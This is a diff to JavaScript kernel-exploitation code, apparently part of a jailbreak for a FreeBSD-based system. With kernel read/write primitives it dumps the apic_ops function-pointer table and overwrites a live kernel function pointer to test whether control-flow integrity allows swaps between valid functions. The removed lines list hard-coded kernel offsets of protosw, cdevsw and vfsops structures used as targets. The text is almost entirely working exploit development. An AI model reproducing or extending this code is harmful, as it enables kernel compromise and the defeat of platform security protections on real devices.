@@ -651,8 +651,8 @@ async function main(userlandRW, wkOnly = false) {
         */
 
         ///////////////////////////////////////////////////////////////////////
-        // CFI BYPASS TEST - Find unprotected function pointers
-        // These are legacy FreeBSD structures that may not be CFI-checked
+        // CFI BYPASS TEST v2 - Use VALID function pointer swap
+        // Instead of garbage, write a REAL kernel function that passes CFI
         ///////////////////////////////////////////////////////////////////////
 
         // Helper to format int64 as hex string
@@ -663,48 +663,81 @@ async function main(userlandRW, wkOnly = false) {
             return "0x" + hi + lo;
         }
 
-        // First verify offset calculation with known-good APIC
-        await log("[CFI TEST] Verifying with known APIC offset...", LogLevel.INFO);
-        await log("[CFI TEST] kdataBase = " + hex64(krw.kdataBase), LogLevel.INFO);
-        let apic_verify = await krw.read8(krw.kdataBase.add32(0x170650 + 0x10));
-        await log("[CFI TEST] APIC xapic_mode = " + hex64(apic_verify), LogLevel.INFO);
+        await log("[CFI v2] Reading all apic_ops function pointers...", LogLevel.INFO);
+        await log("[CFI v2] kdataBase = " + hex64(krw.kdataBase), LogLevel.INFO);
 
-        // Priority candidates from kernel dump analysis
-        const cfi_test_candidates = [
-            // protosw - Protocol switch (5 pointers) - HIGHEST PRIORITY
-            { offset: 0x1552F0, name: 'protosw_1', size: 5 },
-            { offset: 0x1556B0, name: 'protosw_2', size: 5 },
-            { offset: 0x156728, name: 'protosw_3', size: 5 },
-            { offset: 0x156A70, name: 'protosw_4', size: 5 },
+        // apic_ops structure at offset 0x170650 from kdataBase
+        // Contains ~28 function pointers (FreeBSD apic_ops)
+        const APIC_OPS_OFFSET = 0x170650;
+        const apic_ops_base = krw.kdataBase.add32(APIC_OPS_OFFSET);
 
-            // linker_class - Module loader (6 pointers)
-            { offset: 0x14FC20, name: 'linker_class_1', size: 6 },
-            { offset: 0x156EC8, name: 'linker_class_2', size: 6 },
-
-            // cdevsw - Character device switch (12 pointers) - OFTEN UNPROTECTED
-            { offset: 0x158A68, name: 'cdevsw_1', size: 12 },
-            { offset: 0x1703D0, name: 'cdevsw_2', size: 12 },
-            { offset: 0x179180, name: 'cdevsw_3', size: 12 },
-
-            // vfsops - Filesystem ops (7 pointers)
-            { offset: 0x158720, name: 'vfsops_1', size: 7 },
-            { offset: 0x15B020, name: 'vfsops_2', size: 7 },
-
-            // bdevsw - Block device switch (13 pointers)
-            { offset: 0x158228, name: 'bdevsw_1', size: 13 },
-            { offset: 0x17FEA0, name: 'bdevsw_2', size: 13 },
+        // Read all apic_ops function pointers
+        const apic_funcs = [];
+        const apic_names = [
+            "create", "init", "xapic_mode", "is_x2apic", "setup",
+            "dump", "disable", "eoi", "id", "intr_pending",
+            "set_logical_id", "cpuid", "alloc_vector", "alloc_vectors",
+            "enable_vector", "disable_vector", "free_vector", "enable_pmc",
+            "disable_pmc", "reenable_pmc", "enable_cmc", "enable_mca_elvt",
+            "ipi_raw", "ipi_vectored", "ipi_wait", "ipi_alloc", "ipi_free",
+            "set_lvt_mask"
         ];
 
-        // Which candidate to test (set to index, or -1 for read-only mode)
-        // Crashed: 0, 1, 2
-        const CFI_TEST_INDEX = 3;  // protosw_4
+        for (let i = 0; i < 28; i++) {
+            const ptr = await krw.read8(apic_ops_base.add32(i * 8));
+            apic_funcs.push(ptr);
+            const name = apic_names[i] || `func_${i}`;
+            await log(`[APIC ${i}] ${name}: ${hex64(ptr)}`, LogLevel.INFO);
+        }
 
-        await log("[CFI TEST] Scanning " + cfi_test_candidates.length + " candidates...", LogLevel.INFO);
+        // xapic_mode is at index 2, let's try swapping it with another valid APIC function
+        const xapic_mode_addr = apic_ops_base.add32(0x10);  // offset 0x10 = index 2
+        const original_xapic_mode = apic_funcs[2];
 
-        // Get kernel base range for validation
-        const kdataLow = krw.kdataBase.low >>> 0;
-        const kernelRangeHi = (kdataLow >>> 24) & 0xff;  // e.g., 0x83
+        // Try swapping with "eoi" (index 7) - it's a simple function that just sends EOI
+        const eoi_func = apic_funcs[7];
 
+        await log("[CFI v2] ===========================================", LogLevel.INFO);
+        await log("[CFI v2] xapic_mode (target) = " + hex64(original_xapic_mode), LogLevel.INFO);
+        await log("[CFI v2] eoi (swap source)   = " + hex64(eoi_func), LogLevel.INFO);
+
+        const do_swap_test = confirm(
+            "CFI VALID SWAP TEST\n\n" +
+            "Instead of garbage, we'll write a VALID kernel function.\n\n" +
+            "Target: xapic_mode @ " + hex64(xapic_mode_addr) + "\n" +
+            "Current: " + hex64(original_xapic_mode) + "\n" +
+            "Swap to: " + hex64(eoi_func) + " (eoi function)\n\n" +
+            "If CFI is type-based, this should PASS because both are valid APIC functions.\n\n" +
+            "Proceed?"
+        );
+
+        if (do_swap_test) {
+            await log("[CFI v2] Writing eoi address to xapic_mode slot...", LogLevel.WARN);
+            await krw.write8(xapic_mode_addr, eoi_func);
+
+            const verify = await krw.read8(xapic_mode_addr);
+            await log("[CFI v2] Verify: " + hex64(verify), LogLevel.INFO);
+
+            if (verify.low === eoi_func.low && verify.hi === eoi_func.hi) {
+                await log("[CFI v2] *** WRITE SUCCEEDED - NO CRASH! ***", LogLevel.SUCCESS);
+                await log("[CFI v2] CFI accepts valid function pointer swaps!", LogLevel.SUCCESS);
+
+                // Restore original
+                await krw.write8(xapic_mode_addr, original_xapic_mode);
+                await log("[CFI v2] Restored original value", LogLevel.INFO);
+
+                alert(
+                    "SUCCESS!\n\n" +
+                    "CFI allows swapping to valid APIC functions!\n\n" +
+                    "Next step: Find an APIC function that does something exploitable,\n" +
+                    "or try the suspend/resume timing attack."
+                );
+            }
+        }
+
+        // Skip the old brute force test
+        const CFI_TEST_INDEX = -1;  // disabled
+        const cfi_test_candidates = [];  // empty
         for (let i = 0; i < cfi_test_candidates.length; i++) {
             const c = cfi_test_candidates[i];
             const addr = krw.kdataBase.add32(c.offset);
